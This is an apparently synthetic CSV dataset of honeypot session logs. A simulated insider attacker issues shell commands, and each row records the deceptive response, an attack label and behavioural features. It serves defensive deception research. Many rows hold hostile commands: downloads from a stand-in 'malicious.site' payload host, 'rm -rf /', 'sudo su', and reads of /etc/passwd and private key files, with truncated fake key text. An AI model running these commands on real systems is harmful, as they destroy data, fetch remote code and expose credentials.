session_id,attacker_id,attacker_profile,timestamp,attacker_input,honeypot_response,attack_type,risk_level,response_success,current_privileges,failed_attempts,session_position,attack_phase,engagement_time,hawkes_intensity,frustration_level,temporal_phase,deception_triggered,data_collected,privilege_escalation_attempt,high_risk_activity,system_state_hash,time_since_session_start,commands_per_minute
5,4,insider_threat,2025-05-24 23:40:40.247527,find / -name '*.key',Command not found,data_exfiltration,3,False,True,2,126,initial_recon,5.189771040626876,0.1,0.5999999999999985,initial_recon,1,0,0,0,-8958916735605131775,216.0945672849093,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:45.437298,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,127,initial_recon,1.5156525911861012,0.1,0.7999999999999985,initial_recon,1,1,0,0,-8958916735605131775,217.61021987609536,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:46.952951,whoami,user,reconnaissance,1,False,True,2,128,initial_recon,2.7718478369185027,0.1,0.6999999999999985,initial_recon,1,0,0,0,-8958916735605131775,220.38206771301387,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:49.724799,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,1,129,initial_recon,4.909511677367453,0.1,0.8999999999999986,initial_recon,1,1,0,1,-8958916735605131775,225.2915793903813,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:54.634310,rm -rf /,Command executed,destruction,5,True,True,0,130,initial_recon,0.3480547571683134,0.1,0.7999999999999986,initial_recon,1,0,0,1,-8958916735605131775,225.63963414754963,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:54.982365,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,0,131,initial_recon,0.6570348172642244,0.1,0.6999999999999986,initial_recon,1,1,0,1,-8958916735605131775,226.29666896481385,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:55.639400,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,132,initial_recon,2.181019444613443,0.1,0.5999999999999986,initial_recon,1,0,0,0,-8958916735605131775,228.4776884094273,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:57.820419,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,133,initial_recon,0.1936987184597441,0.1,0.4999999999999986,initial_recon,1,1,0,0,-8958916735605131775,228.67138712788704,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:58.014118,whoami,user,reconnaissance,1,False,True,1,134,initial_recon,0.1,0.1,0.3999999999999987,initial_recon,1,0,0,0,-8958916735605131775,228.77138712788704,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:58.114118,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,135,initial_recon,2.5906981877799486,0.1,0.5999999999999988,initial_recon,1,0,0,0,-8958916735605131775,231.36208531566697,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:00.704816,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,136,initial_recon,0.1,0.1,0.4999999999999988,initial_recon,1,1,0,0,-8958916735605131775,231.462085315667,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:00.804816,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,137,initial_recon,1.4212971527639204,0.1,0.3999999999999988,initial_recon,1,1,0,1,-8958916735605131775,232.8833824684309,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:02.226113,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,0,138,initial_recon,0.6811719070198098,0.1,0.2999999999999988,initial_recon,1,1,0,1,-8958916735605131775,233.5645543754507,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:02.907285,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,139,initial_recon,0.450283489286723,0.1,0.1999999999999988,initial_recon,1,1,0,1,-8958916735605131775,234.01483786473744,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:03.357569,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,140,initial_recon,0.1010865309926042,0.1,0.0999999999999988,initial_recon,1,0,0,0,-8958916735605131775,234.11592439573005,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:03.458655,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,141,initial_recon,0.4741145219464216,0.1,0.0,initial_recon,1,1,0,1,-8958916735605131775,234.59003891767645,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:03.932770,crontab -e,Command executed,persistence,3,False,True,1,142,initial_recon,0.6436283964535804,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,235.23366731413003,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:04.576398,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,143,initial_recon,0.3723878585570839,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,235.60605517268712,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:04.948786,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,144,initial_recon,0.3053999383571388,0.1,0.1,initial_recon,1,1,0,0,-8958916735605131775,235.91145511104423,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:05.254186,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,145,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,236.01145511104423,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:05.354186,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,146,initial_recon,0.139846087676151,0.1,0.0,initial_recon,1,1,0,0,-8958916735605131775,236.15130119872043,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:05.494032,whoami,user,reconnaissance,1,True,True,0,147,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,236.25130119872043,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:05.594032,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,148,initial_recon,0.1,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,236.3513011987204,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:05.694032,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,149,initial_recon,0.2101630080955289,0.1,0.0,initial_recon,1,1,0,1,-8958916735605131775,236.56146420681597,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:05.904195,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,150,initial_recon,1.05639122125171,0.1,0.0,initial_recon,1,0,0,0,-8958916735605131775,237.61785542806768,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:06.960586,crontab -e,Command executed,persistence,3,False,True,2,151,initial_recon,0.5896284320513487,0.1,0.2,initial_recon,1,0,0,0,-8958916735605131775,238.207483860119,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:07.550215,whoami,user,reconnaissance,1,False,True,3,152,initial_recon,0.1,0.1,0.4,initial_recon,1,0,0,0,-8958916735605131775,238.30748386011905,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:07.650215,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,2,153,initial_recon,2.946782327682969,0.1,0.6000000000000001,initial_recon,1,1,0,0,-8958916735605131775,241.254266187802,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:10.596997,whoami,user,reconnaissance,1,True,True,1,154,initial_recon,2.688603485148971,0.1,0.5000000000000001,initial_recon,1,0,0,0,-8958916735605131775,243.94286967295093,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:13.285601,crontab -e,Command executed,persistence,3,True,True,0,155,initial_recon,1.2422647754965883,0.1,0.4000000000000001,initial_recon,1,0,0,0,-8958916735605131775,245.18513444844757,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:14.527865,whoami,user,reconnaissance,1,False,True,1,156,initial_recon,0.1,0.1,0.3000000000000001,initial_recon,1,0,0,0,-8958916735605131775,245.28513444844756,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:14.627865,sudo su,Command executed,privilege_escalation,5,False,True,2,157,initial_recon,1.5640289148019315,0.1,0.5000000000000002,initial_recon,1,0,1,1,-8958916735605131775,246.84916336324943,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:16.191894,find / -name '*.key',Command not found,data_exfiltration,3,False,True,3,158,initial_recon,2.151556929579725,0.1,0.7000000000000002,initial_recon,1,0,0,0,-8958916735605131775,249.0007202928292,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:18.343451,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,2,159,initial_recon,0.5505100397259581,0.1,0.9000000000000001,initial_recon,1,0,0,0,-8958916735605131775,249.55123033255515,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:18.893961,rm -rf /,Command executed,destruction,5,False,True,3,160,initial_recon,0.4875629236952678,0.1,0.8000000000000002,initial_recon,1,0,0,1,-8958916735605131775,250.0387932562504,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:19.381524,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,2,161,initial_recon,3.1430458247925217,0.1,1.0000000000000002,initial_recon,1,0,0,0,-8958916735605131775,253.1818390810429,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:22.524570,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,162,initial_recon,1.452675911812225,0.1,0.9000000000000002,initial_recon,1,1,0,0,-8958916735605131775,254.6345149928552,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:23.977246,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,163,initial_recon,2.686216799677487,0.1,0.8000000000000003,initial_recon,1,1,0,0,-8958916735605131775,257.3207317925326,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:26.663463,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,164,initial_recon,9.417167224277645,0.1,0.7000000000000003,initial_recon,1,1,0,1,-8958916735605131775,266.7378990168103,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:36.080630,whoami,user,reconnaissance,1,False,True,1,165,initial_recon,0.3425768340815882,0.1,0.6000000000000003,initial_recon,1,0,0,0,-8958916735605131775,267.0804758508919,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:36.423207,sudo su,Permission denied,privilege_escalation,5,False,True,2,166,initial_recon,1.7010508716988555,0.1,0.8000000000000003,initial_recon,1,0,1,1,-8958916735605131775,268.78152672259074,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:38.124258,sudo su,Command executed,privilege_escalation,5,False,True,3,167,initial_recon,0.3371337727071161,0.1,1.2000000000000002,initial_recon,1,0,1,1,-8958916735605131775,269.11866049529783,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:38.461391,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,2,168,initial_recon,0.7815090464377578,0.1,1.4,initial_recon,1,0,0,0,-8958916735605131775,269.90016954173564,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:39.242901,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,169,initial_recon,2.957058509027044,0.1,1.3,initial_recon,1,1,0,0,-8958916735605131775,272.85722805076267,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:42.199959,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,170,initial_recon,1.3658064323209325,0.1,1.2,initial_recon,1,1,0,0,-8958916735605131775,274.2230344830836,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:43.565765,rm -rf /,Command executed,destruction,5,False,True,1,171,initial_recon,7.311827374472861,0.1,1.1,initial_recon,1,0,0,1,-8958916735605131775,281.53486185755645,28.60222503430908
5,4,insider_threat,2025-05-24 23:41:50.877593,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,2,172,initial_recon,17.18202355522693,0.1,1.2999999999999998,initial_recon,1,0,0,1,-8958916735605131775,298.71688541278337,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:08.059616,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,173,initial_recon,3.51958244999616,0.1,1.4999999999999998,initial_recon,1,1,0,0,-8958916735605131775,302.23646786277953,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:11.579199,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,174,initial_recon,3.4823437557695365,0.1,1.3999999999999997,initial_recon,1,1,0,1,-8958916735605131775,305.71881161854907,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:15.061543,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,175,initial_recon,3.2365724876990747,0.1,1.2999999999999996,initial_recon,1,0,0,0,-8958916735605131775,308.9553841062482,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:18.298115,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,176,initial_recon,3.883846001270689,0.1,1.1999999999999995,initial_recon,1,0,0,0,-8958916735605131775,312.83923010751886,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:22.181961,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,177,initial_recon,1.0591758283835802,0.1,1.3999999999999997,initial_recon,1,1,0,1,-8958916735605131775,313.8984059359024,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:23.241137,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,178,initial_recon,1.2706185559918577,0.1,1.2999999999999994,initial_recon,1,0,0,0,-8958916735605131775,315.1690244918943,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:24.511755,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,179,initial_recon,1.94366240868862,0.1,1.1999999999999993,initial_recon,1,1,0,1,-8958916735605131775,317.1126869005829,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:26.455418,sudo su,Command executed,privilege_escalation,5,True,True,0,180,initial_recon,1.9972724253624363,0.1,1.0999999999999992,initial_recon,1,0,1,1,-8958916735605131775,319.10995932594534,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:28.452690,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,181,initial_recon,1.94409554715494,0.1,0.9999999999999992,initial_recon,1,0,0,1,-8958916735605131775,321.05405487310026,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:30.396786,rm -rf /,Command executed,destruction,5,True,True,0,182,initial_recon,3.9402929417538655,0.1,1.1999999999999993,initial_recon,1,0,0,1,-8958916735605131775,324.99434781485417,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:34.337079,sudo su,Command executed,privilege_escalation,5,False,True,1,183,initial_recon,1.129520064861072,0.1,1.0999999999999992,initial_recon,1,0,1,1,-8958916735605131775,326.1238678797152,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:35.466599,whoami,user,reconnaissance,1,True,True,0,184,initial_recon,2.5194663032519045,0.1,1.2999999999999992,initial_recon,1,0,0,0,-8958916735605131775,328.6433341829671,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:37.986065,sudo su,Command executed,privilege_escalation,5,False,True,1,185,initial_recon,12.073515341022764,0.1,1.199999999999999,initial_recon,1,0,1,1,-8958916735605131775,340.7168495239899,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:50.059581,rm -rf /,Command executed,destruction,5,True,True,0,186,initial_recon,3.457597811581673,0.1,1.399999999999999,initial_recon,1,0,0,1,-8958916735605131775,344.1744473355716,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:53.517178,rm -rf /,Command executed,destruction,5,False,True,1,187,initial_recon,6.124007770385357,0.1,1.299999999999999,initial_recon,1,0,0,1,-8958916735605131775,350.2984551059569,28.60222503430908
5,4,insider_threat,2025-05-24 23:42:59.641186,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,188,initial_recon,1.7048374118089078,0.1,1.499999999999999,initial_recon,1,0,0,0,-8958916735605131775,352.00329251776583,28.60222503430908
5,4,insider_threat,2025-05-24 23:43:01.346024,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,189,initial_recon,2.1182121590764416,0.1,1.3999999999999988,initial_recon,1,1,0,1,-8958916735605131775,354.1215046768423,28.60222503430908
5,4,insider_threat,2025-05-24 23:43:03.464236,sudo su,Permission denied,privilege_escalation,5,False,True,1,190,initial_recon,4.161013975957973,0.1,1.2999999999999987,initial_recon,1,0,1,1,-8958916735605131775,358.2825186528002,28.60222503430908
5,4,insider_threat,2025-05-24 23:43:07.625250,sudo su,Command executed,privilege_escalation,5,False,True,2,191,initial_recon,2.7551148872995554,0.1,1.6999999999999986,initial_recon,1,0,1,1,-8958916735605131775,361.03763354009976,28.60222503430908
5,4,insider_threat,2025-05-24 23:43:10.380365,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,192,initial_recon,8.268303287699995,0.1,1.8999999999999984,initial_recon,1,1,0,0,-8958916735605131775,369.30593682779977,28.60222503430908
